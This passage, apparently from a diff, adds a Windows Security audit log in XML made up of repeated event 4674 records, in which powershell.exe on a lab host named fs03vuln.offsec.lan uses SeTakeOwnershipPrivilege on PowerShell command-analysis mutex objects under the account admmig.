+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937802</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x480</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937803</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x488</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937804</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x488</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937805</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x490</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937806</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x490</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937807</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x498</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937808</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x498</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937809</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x4a0</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937810</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x4a0</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937811</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x4a8</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937812</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x4a8</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937813</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x4b0</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.963984400Z" />
+      <EventRecordID>937814</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x4b0</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.979610100Z" />
+      <EventRecordID>937815</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x4b8</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.979610100Z" />
+      <EventRecordID>937816</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x4b8</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.979610100Z" />
+      <EventRecordID>937817</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x4c0</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.979610100Z" />
+      <EventRecordID>937818</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x4c0</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.979610100Z" />
+      <EventRecordID>937819</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x4c8</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.979610100Z" />
+      <EventRecordID>937820</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">-</Data>
+      <Data Name="ObjectName">-</Data>
+      <Data Name="HandleId">0x4c8</Data>
+      <Data Name="AccessMask">2031617</Data>
+      <Data Name="PrivilegeList">SeTakeOwnershipPrivilege</Data>
+      <Data Name="ProcessId">0x90c</Data>
+      <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
+      <EventID>4674</EventID>
+      <Version>0</Version>
+      <Level>0</Level>
+      <Task>13056</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8020000000000000</Keywords>
+      <TimeCreated SystemTime="2021-11-23T09:26:30.979610100Z" />
+      <EventRecordID>937821</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="480" ThreadID="488" />
+      <Channel>Security</Channel>
+      <Computer>fs03vuln.offsec.lan</Computer>
+      <Security />
+    </System>
+    <EventData>
+      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="SubjectUserName">admmig</Data>
+      <Data Name="SubjectDomainName">OFFSEC</Data>
+      <Data Name="SubjectLogonId">0x8157bac</Data>
+      <Data Name="ObjectServer">Security</Data>
+      <Data Name="ObjectType">Mutant</Data>
+      <Data Name="ObjectName">\BaseNamedObjects\PowerShell_CommandAnalysis_Lock_S-1-5-21-4230534742-2542757381-3142984815-1111</Data>
+      <Data Name="HandleId">0x4d0</Data>
+      <Data Name="AccessMask">%%1537
+				%%1538
+				%%1539
+				%%1540
+				%%1541
+				%%4448
+				</Data>
